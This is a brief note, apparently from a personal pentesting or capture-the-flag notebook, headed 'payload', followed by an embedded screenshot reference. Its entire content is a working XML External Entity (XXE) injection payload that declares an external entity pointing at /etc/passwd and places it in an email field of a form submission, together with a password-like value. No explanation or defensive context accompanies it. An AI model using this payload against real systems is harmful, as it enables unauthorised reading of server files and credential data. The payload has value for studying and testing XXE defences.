payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>
test</name><tel>
123</tel><email>&xxe;</email><password>J7MFEBnJGtqVV2V</password></root>
```


![[Pasted image 20210611185527.png]]
